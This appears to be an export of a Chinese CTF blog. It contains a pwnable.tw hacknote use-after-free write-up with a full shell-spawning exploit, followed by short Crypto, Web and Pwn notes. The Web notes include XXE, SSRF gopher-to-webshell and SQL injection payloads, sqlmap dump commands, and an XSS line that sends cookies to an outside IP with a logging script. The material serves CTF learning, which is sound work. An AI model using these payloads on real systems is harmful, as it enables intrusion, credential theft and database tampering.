class="built_in">free</span>(*(&amp;ptr + v1));</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Success"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> *MK_FP(__GS__, <span class="number">20</span>) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="分析">分析</h3>
<ul>
<li>
<p>通过对<code>addnote</code>函数的分析，我们可以得知<code>note</code>的结构体为</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">note</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">void</span> (*func)(<span class="keyword">void</span>);</span><br><span class="line">  <span class="keyword">char</span>* content;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>而这个<code>func</code>在添加<code>note</code>时会被赋值成<code>myPuts</code>（笔者自己命名的函数名）的函数地址</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">myPuts</span><span class="params">(<span class="keyword">char</span> * note)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(note + <span class="number">4</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>程序每次输出<code>note</code>时都是调用这个函数进行输出<br>
例如：</p>
  <figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">note</span> <span class="title">myNote</span>[5];</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">note</span> <span class="title">myNote</span> = <span class="title">myNote</span> + 3;</span></span><br><span class="line">myNote-&gt;func(myNote);</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><code>deleteNote</code>函数里，程序在<code>free</code>时没有重置指针的值。这是一个很明显、很典型的UAF漏洞。<br>
我们可以利用fastbin链的特性，来使一个可修改的指针指向某个被释放的note的func成员指针，进而修改该指针并执行其指向的函数</p>
<ul>
<li>
<p>我们可以先声明两个note，分别称为note0、note1，注意这两个note的note size必须大于12， 这样content chunk[^1]的大小就会 <strong>大于</strong> note chunk[^2]的大小。</p>
<p>[^1]: 为了方便，我们将分配作为note的chunk称为note chunk<br>
[^2]: 与上条类似，我们同样将分配作为content的chunk称为content chunk</p>
<blockquote>
<p>为什么note size 要大于12， 而不是大于8？<br>
这是因为chunk里<code>prev_size</code>成员的空间复用。<br>
当某个chunk已被分配时，该chunk的下一个虚拟内存相邻chunk，其prev_size成员是无效的，故可被上一个chunk使用</p>
</blockquote>
<p>如此，当这两个note都被释放时，两个note的note chunk会放置进相同索引的fast bin链里，而另外两个content chunk则会放置进 <strong>另一个索引</strong> 的fast bin链里。<br>
这样，note chunk 和 content chunk 在fast bin链中互不干扰<br>
就像这样：<br>
<img src="/2020/04/heap-8-UAF/free_bins1.png" alt="img"></p>
</li>
<li>
<p>第二步就是新建一个新的note2，注意该note的note size要小于12。<br>
这样，fastbin上note1的空间就会被分配，成为note2的content chunk<br>
（fastbin上note0的空间被分配给note2了，成为note chunk，注意fastbin的LIFO）<br>
就像这样：<br>
<img src="/2020/04/heap-8-UAF/free_bins2.png" alt="img"></p>
</li>
<li>
<p><strong>注意</strong>：当程序可以执行system函数时，注意传入的地址为note2的地址，所以<code>[system addr]</code> 以及其后4个字节都会被解释成字符串尝试执行。但[system addr]又必须保留，那该如何get shell呢？<br>
这里有个小技巧，我们可以在最后四个字节构造<code>&quot;||sh&quot;</code>。这样便会执行<code>system(&quot;[system addr]||sh&quot;)</code><br>
由于<code>[system addr]</code>肯定执行失败，所以便会执行到后面的<code>sh</code>。这样便可以get shell</p>
</li>
<li>
<p>最关键的点已经说清楚了，后面的就不再赘述了 :ghost: :ghost:</p>
</li>
</ul>
</li>
</ul>
<h3 id="解决方案">解决方案</h3>
<ol>
<li>新建note0、note1，其note size必须大于12</li>
<li>释放note0、note1</li>
<li>新建note2，其note size必须小于12。<br>
此时note2-&gt;content指针就会指向note1，在新建的过程中，便可修改内存上的内存。
<ul>
<li>修改note1-&gt;func为<code>myPuts</code>函数（func指针默认设置的函数），</li>
<li>修改note1-&gt;content为<code>got@read</code>（随便哪个已经延迟绑定过的函数都行）</li>
</ul>
</li>
<li>输出note1的内容（print note1），从而泄露libc基地址，进而确定<code>system</code>函数的地址</li>
<li>释放note2并重新建立note2，其note size仍然必须小于12<br>
在建立note2过程中，修改以下内容
<ul>
<li>修改note1-&gt;func为<code>system</code>函数</li>
<li>修改note1-&gt;content为<code>&quot;||sh&quot;</code>字符串</li>
</ul>
</li>
<li><s>输出note1的内容（print note1）</s> 执行system(“sh”)， get shell！</li>
</ol>
<h4 id="EXP">EXP</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">"chall.pwnable.tw"</span>, <span class="number">10102</span>)</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">"./libc_32.so.6"</span>)</span><br><span class="line">e = ELF(<span class="string">"./hacknote"</span>)</span><br><span class="line"></span><br><span class="line">context(terminal=[<span class="string">'gnome-terminal'</span>, <span class="string">'-x'</span>, <span class="string">'bash'</span>, <span class="string">'-c'</span>], os=<span class="string">'linux'</span>, arch=<span class="string">'x86'</span>)</span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">addnote</span><span class="params">(len, content)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice :"</span>, <span class="string">"1"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Note size :"</span>, str(len))</span><br><span class="line">    io.sendlineafter(<span class="string">"Content :"</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delnote</span><span class="params">(index)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice :"</span>, <span class="string">"2"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Index :"</span>, str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printnote</span><span class="params">(index)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice :"</span>, <span class="string">"3"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Index :"</span>, str(index))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 新建note0和note1并删除，注意删除顺序</span></span><br><span class="line">addnote(<span class="number">16</span>, <span class="string">''</span>)</span><br><span class="line">addnote(<span class="number">16</span>, <span class="string">''</span>)</span><br><span class="line">delnote(<span class="number">1</span>)</span><br><span class="line">delnote(<span class="number">0</span>)</span><br><span class="line"><span class="comment"># 新建note2，写入数据并执行</span></span><br><span class="line">addnote(<span class="number">8</span>, flat(<span class="number">0x0804862B</span>, e.got[<span class="string">'read'</span>]))</span><br><span class="line">printnote(<span class="number">1</span>)</span><br><span class="line"> <span class="comment"># 上一步泄露出了libc地址，处理得到system函数地址</span></span><br><span class="line">libc_read_addr = u32(io.recv(<span class="number">4</span>))</span><br><span class="line">log.success(<span class="string">'libc read addr: '</span> + hex(libc_read_addr))</span><br><span class="line"><span class="comment"># 删除note2</span></span><br><span class="line">delnote(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">libcbase_addr = libc_read_addr - libc.symbols[<span class="string">'read'</span>]</span><br><span class="line">system_addr = libcbase_addr + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line">log.success(<span class="string">'libcbase addr: '</span> + hex(libcbase_addr))</span><br><span class="line">log.success(<span class="string">'system addr: '</span> + hex(system_addr))</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"><span class="comment"># 重新建立note2，写入system地址和'||sh'字符串，执行函数</span></span><br><span class="line">addnote(<span class="number">8</span>, flat(system_addr, <span class="string">'||sh'</span>))</span><br><span class="line"></span><br><span class="line">printnote(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># get shell！</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>Pwn</tag>
        <tag>Heap</tag>
        <tag>pwnable.tw</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF Crypto 的笔记</title>
    <url>/2020/04/crypto/</url>
    <content><![CDATA[<p>一点点Crypto的笔记，真的只有一点点。</p>
<h2 id="1-RSA">1. RSA</h2>
<ol>
<li>RSA 算法原理
<ol>
<li><a href="https://wiki.x10sec.org/crypto/asymmetric/rsa/rsa_theory/" target="_blank" rel="noopener">CTF-Wiki</a></li>
<li><a href="https://www.kancloud.cn/kancloud/rsa_algorithm/48484" target="_blank" rel="noopener">看云</a></li>
</ol>
</li>
<li>分解质数
<ol>
<li>
<p>命令行分解 - <a href="https://github.com/ryosan-470/factordb-pycli" target="_blank" rel="noopener">Github</a></p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo pip install factordb-pycli</span><br><span class="line">factordb [-h] [--json] number</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>在线解两质数相乘 - <a href="http://factordb.com/index.php" target="_blank" rel="noopener">网址</a></p>
</li>
</ol>
</li>
</ol>
<a id="more"></a>
<ol start="3">
<li>
<p>常用exp</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy</span><br><span class="line"><span class="keyword">from</span> Crypto.Util <span class="keyword">import</span> number</span><br><span class="line"></span><br><span class="line">n=<span class="number">1606938044309278499168642398192229212629290234347717645487123</span></span><br><span class="line">p == <span class="number">1267650600235241044365044382487</span></span><br><span class="line">q == <span class="number">1267650600260888172240281085029</span></span><br><span class="line"></span><br><span class="line">r = (p<span class="number">-1</span>) * (q<span class="number">-1</span>)</span><br><span class="line"></span><br><span class="line">e=<span class="number">0x10001</span></span><br><span class="line">cipher=<span class="number">1206101155741464091016050901578054614292420649123909371122176</span></span><br><span class="line"></span><br><span class="line">d = gmpy.invert(e, r)</span><br><span class="line">m = pow(cipher, d, n)</span><br><span class="line">print(number.long_to_bytes(m))</span><br></pre></td></tr></table></figure>
</li>
</ol>
]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>Crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF Web 的笔记</title>
    <url>/2020/04/CTF_web/</url>
    <content><![CDATA[<p>一点点曾经整理的Web笔记，篇幅会相对较小一点。</p>
<h2 id="1-XXE-攻击-XML">1. XXE 攻击 (XML)</h2>
<ol>
<li>
<p>示例</p>
 <figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [<span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"php://filter/read=convert.base64-encode/resource=flag.php"</span>&gt;</span> ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">username</span>&gt;</span></span><br><span class="line">    <span class="symbol">&amp;xxe;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">password</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
</ol>
<h2 id="2-SSRF">2. SSRF</h2>
<h3 id="函数的注意点">函数的注意点</h3>
<h4 id="1-cURL">1. cURL</h4>
<h4 id="2-file-get-contents">2. file_get_contents</h4>
<ul>
<li>gopher 协议无法URLencode</li>
<li>关于gopher的302跳转有bug，导致利用失败</li>
</ul>
<a id="more"></a>
<h3 id="一个有趣的域名">一个有趣的域名</h3>
<p><a href="http://xip.io" target="_blank" rel="noopener">xip.io</a> - 这个域名在bypass WAF时可能会有点作用<br>
以下是简介</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">What is xip.io?</span><br><span class="line">xip.io is a magic domain name that provides wildcard DNS</span><br><span class="line">for any IP address. Say your LAN IP address is 10.0.0.1.</span><br><span class="line">Using xip.io,</span><br><span class="line"></span><br><span class="line">          10.0.0.1.xip.io   resolves to   10.0.0.1</span><br><span class="line">      www.10.0.0.1.xip.io   resolves to   10.0.0.1</span><br><span class="line">   mysite.10.0.0.1.xip.io   resolves to   10.0.0.1</span><br><span class="line">  foo.bar.10.0.0.1.xip.io   resolves to   10.0.0.1</span><br><span class="line"></span><br><span class="line">...and so on. You can use these domains to access virtual</span><br><span class="line">hosts on your development web server from devices on your</span><br><span class="line">local network, like iPads, iPhones, and other computers.</span><br><span class="line">No configuration required!</span><br></pre></td></tr></table></figure>
<blockquote>
<p>注意：windows清除本地DNS缓存的命令为<br>
ipconfig/flusdns<br>
（别问我为什么要给出来，相信我，你一定会用上的 <strong>XD</strong>)</p>
</blockquote>
<h3 id="1-file协议">1. file协议</h3>
<blockquote>
<p>file://localhost/etc/passwd 能够读取到 /etc/passwd 的内容，同时这种情况会忽略 host</p>
</blockquote>
<h3 id="2-gopher协议">2. gopher协议</h3>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gopher:&#x2F;&#x2F;&#123;host&#125;:&#123;port&#125;&#x2F;_&#123;body&#125;</span><br></pre></td></tr></table></figure>
<p>使用方法：</p>
<ol>
<li>
<p>首先构造 POST 的 payload</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin&#x3D;h1admin&amp;hacker&#x3D;system(&quot;ls&quot;);</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>然后构造整个 HTTP 请求（ <strong>Content-Length不能少</strong> ）<br>
注意:</p>
<ul>
<li>每个冒号后面都有一个空格</li>
<li>http头和携带的请求数据之间间隔一个空行</li>
<li>所有的换行都是 <strong>'\r\n’</strong></li>
<li>分号一定要用 <code>%3B</code></li>
<li>Content-Length 是 html报文中 body的长度（URL编码前） ， 不包括报头
<ul>
<li>Content-Length一定要设置正确，否则会返回http 400错误</li>
</ul>
</li>
</ul>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;webshe11111111.php HTTP&#x2F;1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">User-Agent: curl&#x2F;7.43.0</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Content-Length: 34</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">admin&#x3D;h1admin&amp;hacker&#x3D;system(&quot;ls&quot;);</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>加上协议的其他部分</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gopher:&#x2F;&#x2F;127.0.0.1:80&#x2F;_POST &#x2F;webshe11111111.php HTTP&#x2F;1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">User-Agent: curl&#x2F;7.43.0</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Content-Length: 34</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">admin&#x3D;h1admin&amp;hacker&#x3D;system(&quot;ls&quot;);</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>url 编码 （有些部分需要二次编码，例如<code>%0d %0a %20 分别编码为 %250d %250a %2520</code>）</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gopher%3A%2F%2F127.0.0.1%3A80%2F_POST%2520%2Fwebshe11231231231.php%2520HTTP%2F1.1%250D%250AHost%3A%2520127.0.0.1%250D%250AUser-Agent%3A%2520curl%2F7.43.0%250D%250AAccept%3A%2520*%2F*%250D%250AContent-Length%3A%252034%250D%250AContent-Type%3A%2520application%2Fx-www-form-urlencoded%250D%250A%250D%250Aadmin%3Dh1admin%26hacker%3Dsystem(%22ls%22)%3B</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>访问该地址得到目录下的文件</p>
</li>
</ol>
<h2 id="3-xss攻击">3. xss攻击</h2>
<ul>
<li>
<p>源码</p>
  <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>( $_GET[<span class="string">"code"</span>]))</span><br><span class="line">    $cookie = $_GET[<span class="string">"code"</span>];</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    $cookie = <span class="string">"no_cookies"</span>;</span><br><span class="line">$time = date(<span class="string">'Y-m-d g:i:s'</span>);</span><br><span class="line">$fp = fopen(<span class="string">"cookie.txt"</span>,<span class="string">"a"</span>);</span><br><span class="line">fwrite($fp, <span class="string">"Date: "</span>.$time.<span class="string">" Cookie:"</span>.$cookie.<span class="string">"\n"</span>);</span><br><span class="line">fclose($fp);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Visited"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//  &lt;script&gt;document.location="http://222.186.150.131:37992/index.php?code="+document.cookie;&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li>
<p>有趣的域名</p>
<ul>
<li>倘若自己没有独立的服务器， 或不能内网穿透，可以试试这个域名
<ul>
<li><a href="http://ceye.io" target="_blank" rel="noopener">ceye.io</a></li>
</ul>
</li>
<li>这个网站会记录下发送到个人子域名的所有http流量，如此便可以得到返回的cookie</li>
</ul>
</li>
</ul>
<p>在console窗口中输入如下代码刷新页面即可设置新cookies</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">document.cookie="keyName=cookeiValue";</span><br></pre></td></tr></table></figure>
<h2 id="4-⽂件包含-伪协议-base64-解码">4. ⽂件包含+伪协议 base64 解码</h2>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;test.com&#x2F;index.php?action&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure>
<h2 id="5-SQL">5. SQL</h2>
<ol>
<li>
<p>sql 注入</p>
<blockquote>
<p>注意点：<br>
在地址栏输入<code>#</code>时，应尽量改写成<code>%23</code>，原因是<code>#</code>在地址栏中有特殊的含义<br>
在地址栏输入空格<code> </code>时，应尽量改写成<code>%20</code>或<code>+</code></p>
</blockquote>
<ol>
<li>
<p>常用过WAF的套路</p>
<ol>
<li>
<p>空格过滤</p>
<ul>
<li>用注释符<code>/**/</code></li>
</ul>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id=1'<span class="comment">/*1*/</span>union<span class="comment">/*1*/</span><span class="keyword">select</span><span class="comment">/*1*/</span><span class="keyword">database</span>();<span class="comment">#</span></span><br></pre></td></tr></table></figure>
</li>
</ol>
</li>
<li>
<p>常用语句</p>
<ol>
<li>
<p>判断当前表的列数</p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">order by 列数 %23</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>获取当前数据库名</p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">union <span class="keyword">select</span> <span class="keyword">database</span>() %<span class="number">23</span></span><br></pre></td></tr></table></figure>
</li>
<li>
<p>获取所有数据库名</p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">union <span class="keyword">select</span> <span class="keyword">group_concat</span>(SCHEMA_NAME) <span class="keyword">from</span> information_schema.SCHEMATA %<span class="number">23</span></span><br></pre></td></tr></table></figure>
</li>
<li>
<p>获取指定数据库的表名</p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">union <span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">'数据库名'</span> %<span class="number">23</span></span><br></pre></td></tr></table></figure>
</li>
<li>
<p>获取指定数据表的列名（字段名）</p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">union <span class="keyword">select</span> <span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema=<span class="string">'数据库名'</span> <span class="keyword">and</span> table_name=<span class="string">'表名'</span> %<span class="number">23</span></span><br></pre></td></tr></table></figure>
</li>
<li>
<p>获取指定数据表指定字段的全部数据（使用<code>where</code>指定单一数据）</p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">union <span class="keyword">select</span> 字段名 <span class="keyword">from</span> 表名 %<span class="number">23</span></span><br></pre></td></tr></table></figure>
</li>
<li>
<p>修改指定数据表指定字段的数据（使用<code>where</code>指定单一数据）</p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">; <span class="keyword">UPDATE</span> 表名 <span class="keyword">set</span> 字段=内容 <span class="keyword">where</span> <span class="number">1</span>=<span class="number">1</span></span><br></pre></td></tr></table></figure>
</li>
</ol>
</li>
</ol>
</li>
<li>
<p><a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="noopener">Sqli-labs</a></p>
</li>
<li>
<p>sqlmap常用语法</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">检查注入点：</span><br><span class="line">sqlmap -u http:&#x2F;&#x2F;xxxx.com&#x2F;index.php?artist_id&#x3D;11</span><br><span class="line"></span><br><span class="line">爆所有数据库信息：</span><br><span class="line">sqlmap -u http:&#x2F;&#x2F;xxxx.com&#x2F;index.php?artist_id&#x3D;11 --dbs</span><br><span class="line"></span><br><span class="line">爆当前数据库信息：</span><br><span class="line">sqlmap -u http:&#x2F;&#x2F;xxxx.com&#x2F;index.php?artist_id&#x3D;11 --current-db</span><br><span class="line"></span><br><span class="line">指定库名列出所有表</span><br><span class="line">sqlmap -u http:&#x2F;&#x2F;xxxx.com&#x2F;index.php?artist_id＝11 -D vhost48330 --tables # &#39;vhost48330&#39; 为指定数据库名称</span><br><span class="line"></span><br><span class="line">指定库名表名列出所有字段</span><br><span class="line">sqlmap -u http:&#x2F;&#x2F;xxxx.com&#x2F;index.php?artist_id＝11 -D vhost48330 -T admin --columns# &#39;admin&#39; 为指定表名称</span><br><span class="line"></span><br><span class="line">指定库名表名字段dump出指定字段</span><br><span class="line">sqlmap -u http:&#x2F;&#x2F;xxxx.com&#x2F;index.php?artist_id＝11 -D vhost48330 -T admin -C ac，id，password --dump# &#39;ac,id,password&#39; 为指定字段名称</span><br><span class="line"></span><br><span class="line">各种过WAF的tamper脚本</span><br><span class="line">sqlmap -u http:&#x2F;&#x2F;xxxx.com&#x2F;index.php?artist_id&#x3D;11 --dbs --tamper&#x3D;&quot;space2plus.py,hex2char.py&quot;</span><br><span class="line"></span><br><span class="line">使用多线程</span><br><span class="line">sqlmap -u http:&#x2F;&#x2F;xxxx.com&#x2F;index.php?artist_id&#x3D;11 --dbs --thread&#x3D;10</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>其他</p>
<ol>
<li><strong>information_schema</strong> 数据库表说明:
<ul>
<li>SCHEMATA 表：提供了当前 mysql 实例中所有数据库的信息。<code>show databases</code> 的结果取之此表。</li>
<li>TABLES 表：提供了关于数据库中的表的信息（包括视图）。详细表述了某个表属于哪个 schema，表类型，表引擎，创建时间等信息。<code>show tables from schemaname</code> 的结果取之此表。</li>
<li>COLUMNS 表：提供了表中的列信息。详细表述了某张表的所有列以及每个列的信息。<code>show columns from schemaname.tablename</code> 的结果取之此表。</li>
</ul>
</li>
</ol>
</li>
<li>
<p>常用 sql 语法</p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">UNION 操作符用于合并两个或多个 <span class="keyword">SELECT</span> 语句的结果集。</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h2 id="6-php">6. php</h2>
<ol>
<li>
<p>php 超全局变量</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$GLOBALS</span><br><span class="line">$_SERVER</span><br><span class="line">$_REQUEST</span><br><span class="line">$_POST</span><br><span class="line">$_GET</span><br><span class="line">$_FILES</span><br><span class="line">$_ENV</span><br><span class="line">$_COOKIE</span><br><span class="line">$_SESSION</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>md5 碰撞 =&gt; 利用 php 弱类型</p>
</li>
</ol>
<ul>
<li>0e 纯数字的字符串在判断相等的时候会被认为是科学计数法的数字，⽐较时⾸先会做字符串到数字的转换。</li>
<li>转换后都成为了 0 的 n 次⽅，相等。</li>
<li>md5 以 0e 开头的字符例子： <code>QNKCDZO</code> <code>240610708</code></li>
</ul>
]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF Pwn 的杂项笔记</title>
    <url>/2020/04/pwn/</url>
    <content><![CDATA[<p>这里是笔者记录的一些内容较少、不便于整理出一篇博客的<strong>Pwn杂项</strong>知识点。</p>
<h2 id="1-docker-使用-使用手册">1. docker 使用 - <a href="http://www.docker.org.cn/index.html" target="_blank" rel="noopener">使用手册</a></h2>
<h2 id="2-漏洞">2. 漏洞</h2>
<ol>
<li>
<p>格式化字符串</p>
 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// %lln 四字 / %ln 双字 / %hn 单字 / %hhn 字节</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%(n-1)$[format]"</span>); <span class="comment">// -&gt; 第n个参数</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%&#123;n-1&#125;$n"</span>); <span class="comment">// -&gt; 将输出的字符个数写入第n个参数</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%nc"</span>); <span class="comment">// -&gt; 输出对应参数n个字符</span></span><br></pre></td></tr></table></figure>
</li>
</ol>
<a id="more"></a>
<h2 id="3-绕过防护的手段">3. 绕过防护的手段</h2>
<ol>
<li>NX ------ 使用 ROPgadget 搜索可利用的小片段代码</li>
<li>Canary – 读取 Canary 值并在 payload 中使用</li>
<li>PIE ------ 由于相对偏移量不变，尝试泄露出任意一个基地址即可绕过</li>
</ol>
<h2 id="4-pwntools-docs">4. pwntools - <a href="http://docs.pwntools.com/en/stable/" target="_blank" rel="noopener">docs</a></h2>
<ol>
<li>
<p>DynELF 类 - 用于泄露 libc - <a href="http://docs.pwntools.com/en/stable/dynelf.html" target="_blank" rel="noopener">docs</a></p>
<ol>
<li>
<blockquote>
<p>注意：构建leak函数时，必要时刻需要重置栈<br>
防止因为部分关键数据被覆盖而导致leak失败陷入死循环</p>
</blockquote>
</li>
</ol>
</li>
<li>
<p>Fmtstr 类 - 对 printf 漏洞构造恶意 format - <a href="http://docs.pwntools.com/en/stable/fmtstr.html" target="_blank" rel="noopener">docs</a></p>
<ol>
<li>较常使用的功能是<br>
<code>fmtstr_payload(offset,{address:data}, numbwritten=0, write_size=’byte’)</code>。
<blockquote>
<p>第一个参数 offset 是第一个可控的栈偏移(不包含格式化字符串参数)<br>
第二个字典看名字就可以理解，<br>
numbwritten 是指 printf 在格式化字符串之前输出的数据，比如 printf(“Hello [var]”)，此时在可控变量之前已经输出了“Hello ”共计六个字符，应该设置参数值为 6。<br>
第四个选择用 %hhn(byte),%hn(word)还是%n(dword).在我们的例子里就可以写成 fmtstr_payload(5, {printf_got:system_plt})</p>
</blockquote>
</li>
</ol>
</li>
<li>
<p>shellcraft 类 - shellcode 生成器</p>
<ol>
<li>
<p>使用前需先指定平台</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">context(os=<span class="string">"linux"</span>, arch=<span class="string">"amd64"</span>, bits=<span class="number">64</span>)</span><br></pre></td></tr></table></figure>
</li>
</ol>
</li>
<li>
<p>部分函数声明</p>
<ol>
<li>log
<ol>
<li><code>log.success()</code></li>
<li><code>log.info()</code></li>
<li><code>log.error()</code></li>
<li><code>log.failure()</code></li>
<li><code>context.level</code> = ‘debug’/‘error’</li>
</ol>
</li>
<li><code>p64(int)</code> —— 传入值，传出 bytes</li>
<li><code>u64(bytes)</code> —— 与 p64 相反</li>
<li><code>ELF(elf_path_str)</code> —— 读取 ELF 文件（可执行文件，.so 共享库…）</li>
<li><code>process(path_str)</code> —— 执行传入文件路径上的程序</li>
<li><code>remote(ip_str, port_int</code>)` —— 传入格式为字符串的 ip 地址，以及格式为值的端口，连接并得到 IO 对象</li>
<li><code>send(bytes)</code> —— 发送数据，不带 0x0A</li>
<li><code>sendline(bytes)</code> —— 发送数据，结尾带 0x0A(’\n’)</li>
<li><code>recv(int)</code> —— 参数可选，接收 n 个字节的数据</li>
<li><code>recvline()</code> —— 接收数据，在没有接收到换行符的情况下一直阻塞</li>
<li><code>recvuntil(Str)</code> —— 一直读取输出的信息，直到读取到传入的字符串</li>
</ol>
</li>
<li>
<p>有时候可能会因为缓冲区的问题阻塞一部分数据，加上 sleep 调整可能会得到改善</p>
</li>
</ol>
<h2 id="5-One-gadget-github">5. One_gadget - <a href="https://github.com/david942j/one_gadget" target="_blank" rel="noopener">github</a></h2>
<h2 id="6-ROPgadget">6. ROPgadget</h2>
<ol>
<li>
<pre><code class="language-bash"> # 查找字符串
 ROPgadget --binary ./pwn --string &quot;/bin/sh&quot;
 # 查找全部的gadget，并通过管道将信息发送到grep进行筛选
 ROPgadget --binary ./pwn1_64 | grep &quot;pop rdi&quot;
 #筛选出有pop或ret的片段
 ROPgadget --binary ./pwn1_64 --only &quot;pop|ret&quot;
